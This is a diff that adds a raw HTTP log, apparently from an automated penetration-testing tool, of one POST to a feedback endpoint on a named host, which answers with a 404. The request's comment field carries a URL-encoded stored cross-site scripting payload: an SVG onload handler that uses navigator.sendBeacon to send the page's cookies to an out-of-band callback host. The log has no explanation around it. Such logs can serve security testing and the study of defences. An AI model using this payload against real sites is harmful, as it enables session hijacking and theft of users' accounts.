@@ -1,0 +1,15 @@
+REQUEST:
+POST https://meilisearch.baliprov.dev/api/Feedbacks
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+comment=%3Csvg+onload%3D%22navigator.sendBeacon%28%27http%3A%2F%2Fwu5mcudyp7wehiux6ywcztv0pb5e60u8t.oast.fun%2F%27%2Cdocument.cookie%29%22%3E&rating=1
+
+RESPONSE:
+HTTP 404
+Date: Wed, 25 Nov 2026 00:26:02 GMT
+Transfer-Encoding: chunked
+Connection: keep-alive
+Server: nginx/1.10.3
+Content-Encoding: gzip
+
